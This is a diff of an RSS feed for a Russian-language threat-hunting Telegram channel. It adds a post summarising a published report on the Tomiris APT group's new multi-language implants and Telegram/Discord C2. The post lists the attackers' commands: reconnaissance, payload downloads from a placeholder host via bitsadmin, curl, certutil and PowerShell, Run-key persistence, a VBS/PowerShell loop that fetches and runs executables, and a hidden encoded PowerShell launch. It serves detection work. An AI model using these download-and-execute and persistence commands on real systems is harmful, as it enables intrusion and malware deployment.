@@ -1,5 +1,87 @@
 <?xml version="1.0" encoding="utf-8"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Threat Hunting Father 🦔</title><link>https://t.me/ThreatHuntingFather</link><description>All about Threat Hunting, detecting malicious activity</description><language>ru</language><lastBuildDate>Thu, 27 Nov 2025 16:35:12 +0000</lastBuildDate><item><title>Short-лист для детекта удаления драйвера через smss.exe</title><link>https://t.me/ThreatHuntingFather/970</link><description>Short-лист для детекта удаления драйвера через smss.exe
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Threat Hunting Father 🦔</title><link>https://t.me/ThreatHuntingFather</link><description>All about Threat Hunting, detecting malicious activity</description><language>ru</language><lastBuildDate>Fri, 28 Nov 2025 12:46:29 +0000</lastBuildDate><item><title>Tomiris new tools</title><link>https://t.me/ThreatHuntingFather/971</link><description>Tomiris new tools
+Tomiris перешли на мульти-язычные импланты и массовый уход в публичные C2 (Telegram/Discord). Первичный доступ - фишинг с длинными русскими именами .doc&lt;пробелы&gt;.exe. Дальше - ReverseShell → Havoc/AdaptixC2.
+Формат атаки
+Фишинг-архив → EXE с маскировкой под документ → reverse shell (C/C++/Rust/Go/Python/PowerShell) → загрузка AdaptixC2/Havoc → дальнейшая эксплуатация.
+Новые особенности
+C2 через публичные сервисы:
+Discord webhooks → Rust Downloader, Python Discord ReverseShell
+Telegram bot API → Python Telegram RS, C# Telegram RS, PowerShell Telegram Backdoor
+Многоязычные импланты:
+C/C++ ReverseShell (несколько вариантов)
+Rust Downloader + Rust ReverseShell
+Python Discord RS + Python FileGrabber + Python Telegram RS
+C# Telegram RS
+Go ReverseShell и Go ReverseSocks
+PowerShell Telegram Backdoor
+Новая цепочка Rust Downloader:
+сбор системной информации → отправка на Discord;
+поиск файлов → отправка только путей;
+дроп VBS+PS1 → цикл загрузки 1.zip → распаковка → запуск всех .exe.
+Активное использование open-source фреймворков:
+AdaptixC2
+Havoc
+Dystopia-C2 (в Distopia Backdoor)
+ReverseSocks5-форки (C++ и Go)
+Повторяющиеся паттерны доставки:
+длинные русские названия .exe
+файлы в архивах с паролем формата xyz@2025
+одинаковые имена → разные импланты внутри
+Разведка и базовые команды
+echo 4fUPU7tGOJBlT6D1wZTUk
+whoami
+ipconfig /all
+systeminfo
+hostname
+net user /dom
+dir
+dir C:\users\[username]
+Загрузка последующих стадий
+bitsadmin /transfer www /download http://&lt;HOST&gt;/winupdate.exe $public\libraries\winvt.exe
+curl -o $public\libraries\service.exe http://&lt;HOST&gt;/service.exe
+certutil -urlcache -f https://&lt;HOST&gt;/AkelPad.rar $public\libraries\AkelPad.rar
+powershell.exe -Command powershell -Command "Invoke-WebRequest -Uri 'https://&lt;HOST&gt;/winupdate.exe' -OutFile '$public\pictures\sbschost.exe'"
+Проверка успешной загрузки
+dir $temp
+dir $public\libraries
+Persistence через реестр
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WinUpdate /t REG_SZ /d $public\pictures\winupdate.exe /f
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Win-NetAlone" /t REG_SZ /d "$public\videos\alone.exe"
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Winservice" /t REG_SZ /d "$public\Pictures\dwm.exe"
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v CurrentVersion /t REG_SZ /d $public\Pictures\sbschost.exe /f
+Проверка persistence
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+Команды Rust Downloader (запуск через cmd.exe)
+cmd /C "ipconfig /all"
+cmd /C "echo %username%"
+cmd /C hostname
+cmd /C ver
+cmd /C curl hxxps://ipinfo.io/ip
+cmd /C curl hxxps://ipinfo.io/country"
+Дроп и выполнение VBS/Powershell скриптов
+script.vbs:
+Set Shell = CreateObject("WScript.Shell")
+Shell.Run "powershell -ep Bypass -w hidden -File %temp%\script.ps1"
+Часть логики script.ps1 (цикл загрузки ZIP):
+Invoke-WebRequest -Uri $Url -UseBasicParsing -ErrorAction Stop
+iwr -OutFile $env:Temp\1.zip -Uri $dUrl
+tar -xf $env:Temp\1.zip -C $env:Temp\rfolder
+Get-ChildItem $env:Temp\rfolder -Filter "*.exe" | ForEach-Object { Start-Process $_.FullName }
+Команда загрузки Python FileGrabber
+cmd.exe /c "curl -o $public\videos\offel.exe http://&lt;HOST&gt;/offel.exe"
+Команды Distopia Backdoor (выполненные оператором)
+cmd.exe /c "dir"
+cmd.exe /c "dir C:\user\[username]\pictures"
+cmd.exe /c "pwd"
+cmd.exe /c "curl -O $public\sysmgmt.exe http://&lt;HOST&gt;/private/svchost.exe"
+cmd.exe /c "$public\sysmgmt.exe"
+PowerShell Telegram Backdoor (вызов дроппера)
+powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand &lt;Base64&gt;
+🔗https://securelist.com/tomiris-new-tools/118143/
+Псевдонимы: YoroTrooper | SturgeonPhisher | Silent Lynx | COMRADE SAIGA | Tomiris | ShadowSilk
+🦔THF
+
+[Media: Фото]</description><pubDate>Fri, 28 Nov 2025 12:46:29 +0000</pubDate><guid isPermaLink="false">telegram_ThreatHuntingFather_971</guid></item><item><title>Short-лист для детекта удаления драйвера через smss.exe</title><link>https://t.me/ThreatHuntingFather/970</link><description>Short-лист для детекта удаления драйвера через smss.exe
 1) Изменения ключа ExistingPageFiles (кроме pagefile.sys)
 По документации в ExistingPageFiles должен находиться путь только к существующим файлам подкачки. Любое значение, где отсутствует pagefile.sys или указан другой .sys, особенно относящийся к AV/EDR, -  повод для охоты. Опасные признаки: путь к .sys в ProgramData, Temp, Public и других нетипичных директориях.
 2) NT-путь вида ??\C:\… в ExistingPageFiles
